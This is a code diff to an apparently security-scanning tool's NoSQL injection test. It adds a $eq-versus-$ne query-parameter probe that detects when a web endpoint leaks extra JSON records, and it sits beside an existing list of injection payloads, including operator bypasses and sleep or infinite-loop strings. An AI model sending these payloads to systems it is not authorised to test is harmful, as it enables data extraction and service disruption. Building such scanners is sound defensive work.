@@ -2274,7 +2274,7 @@ async def nosql_injection_test(url: str) -> dict[str, Any]:
     - Generic error pages
     - WAF/honeypot responses
     """
-    results: dict[str, Any] = {"vulnerable": False, "payloads_tested": [], "evidence": []}
+    results: dict[str, Any] = {"vulnerable": False, "payloads_tested": [], "evidence": [], "findings": []}
     payloads: list[Any] = [{"$ne": "1"}, {"$gt": ""}, {"$regex": ".*"}, "';return true;var foo='", "\\x27;return true;var foo=\\x27", "{\"$ne\":null}", "{\"$ne\":\"\"}", "{\"$or\":[{},{}]}", "';while(1);var foo='", "';sleep(5000);var foo='", "[\"$ne\"]", "{\"$where\":\"sleep(5000)\"}"]
 
     def _is_html_response(content: str) -> bool:
@@ -2312,6 +2312,142 @@ async def nosql_injection_test(url: str) -> dict[str, Any]:
             if re.search(pattern, content, re.IGNORECASE):
                 return True, name
         return False, None
+
+    def _query_operator_url(param: str, op: str, value: str) -> str:
+        parsed = urllib.parse.urlparse(url)
+        qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+        filtered = [(k, v) for k, v in qs if k != param and not k.startswith(f"{param}[")]
+        filtered.append((f"{param}[{op}]", value))
+        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(filtered)))
+
+    def _json_collection_stats(body: str) -> dict[str, Any]:
+        stats: dict[str, Any] = {
+            "valid_json": False,
+            "max_array_items": 0,
+            "object_key_count": 0,
+            "data_keys": set(),
+        }
+        if not body:
+            return stats
+        try:
+            parsed_body = json.loads(body)
+        except Exception:
+            return stats
+        stats["valid_json"] = True
+
+        def _walk(value: Any, depth: int = 0) -> None:
+            if depth > 5:
+                return
+            if isinstance(value, dict):
+                stats["object_key_count"] += len(value)
+                for key, child in value.items():
+                    stats["data_keys"].add(str(key).lower())
+                    _walk(child, depth + 1)
+            elif isinstance(value, list):
+                stats["max_array_items"] = max(int(stats["max_array_items"]), len(value))
+                for child in value[:10]:
+                    _walk(child, depth + 1)
+
+        _walk(parsed_body)
+        return stats
+
+    def _query_collection_diff_evidence(
+        control_body: str,
+        permissive_body: str,
+        *,
+        control_status: int | None,
+        permissive_status: int | None,
+    ) -> dict[str, Any] | None:
+        if permissive_status is None or not (200 <= permissive_status < 300):
+            return None
+        if _is_html_response(permissive_body):
+            return None
+        permissive_stats = _json_collection_stats(permissive_body)
+        if not permissive_stats["valid_json"]:
+            return None
+        control_stats = _json_collection_stats(control_body)
+        p_items = int(permissive_stats["max_array_items"])
+        c_items = int(control_stats["max_array_items"])
+        p_keys = permissive_stats["data_keys"]
+        data_key_markers = {
+            "id", "_id", "uid", "product", "productid", "product_id", "review",
+            "reviews", "comment", "comments", "message", "rating", "email",
+            "user", "username", "author", "createdat", "updatedat", "name",
+            "title", "description",
+        }
+        has_data_shape = (
+            p_items >= 2
+            and int(permissive_stats["object_key_count"]) >= 2
+            and bool(p_keys.intersection(data_key_markers) or len(p_keys) >= 3)
+        )
+        if not has_data_shape:
+            return None
+        control_rejected = control_status in (400, 401, 403, 404, 422)
+        expanded_items = p_items >= max(2, c_items + 2)
+        expanded_bytes = len(permissive_body or "") >= len(control_body or "") + 120
+        if control_rejected or (expanded_items and expanded_bytes):
+            return {
+                "control_status": control_status,
+                "payload_status": permissive_status,
+                "control_items": c_items,
+                "payload_items": p_items,
+                "control_length": len(control_body or ""),
+                "payload_length": len(permissive_body or ""),
+            }
+        return None
+
+    parsed_url = urllib.parse.urlparse(url)
+    query_params = [name for name in urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True).keys() if name]
+    if query_params:
+        status_marker = "__SHAKERSCAN_NOSQL_QUERY__"
+        for param in query_params[:5]:
+            control_url = _query_operator_url(param, "$eq", "shakerscan_nx_8f3a2e")
+            permissive_url = _query_operator_url(param, "$ne", "shakerscan_nx_8f3a2e")
+            control_raw, _, control_rc = await run([
+                "curl", "-sS", "-L", "-k", "--max-time", "10",
+                "-w", f"{status_marker}%{{http_code}}{status_marker}",
+                control_url,
+            ], timeout=15)
+            permissive_raw, _, permissive_rc = await run([
+                "curl", "-sS", "-L", "-k", "--max-time", "10",
+                "-w", f"{status_marker}%{{http_code}}{status_marker}",
+                permissive_url,
+            ], timeout=15)
+            results["payloads_tested"].extend([f"{param}[$eq]", f"{param}[$ne]"])
+            if control_rc != 0 or permissive_rc != 0:
+                continue
+
+            def _split_status(raw: str | None) -> tuple[str, int | None]:
+                text = raw or ""
+                if status_marker not in text:
+                    return text, None
+                body, _, rest = text.partition(status_marker)
+                code_text, _, _tail = rest.partition(status_marker)
+                try:
+                    return body, int(code_text)
+                except (TypeError, ValueError):
+                    return body, None
+
+            control_body, control_status = _split_status(control_raw)
+            permissive_body, permissive_status = _split_status(permissive_raw)
+            evidence = _query_collection_diff_evidence(
+                control_body,
+                permissive_body,
+                control_status=control_status,
+                permissive_status=permissive_status,
+            )
+            if evidence:
+                finding = {
+                    "parameter": param,
+                    "payload": f"{param}[$ne]=shakerscan_nx_8f3a2e",
+                    "evidence_type": "operator_query_collection_differential",
+                    "response_snippet": permissive_body[:500],
+                    **evidence,
+                }
+                results["vulnerable"] = True
+                results["evidence"].append(finding)
+                results["findings"].append(finding)
+                return results
 
     # Get baseline timing for time-based detection (3 samples to establish normal response time)
     baseline_times = []
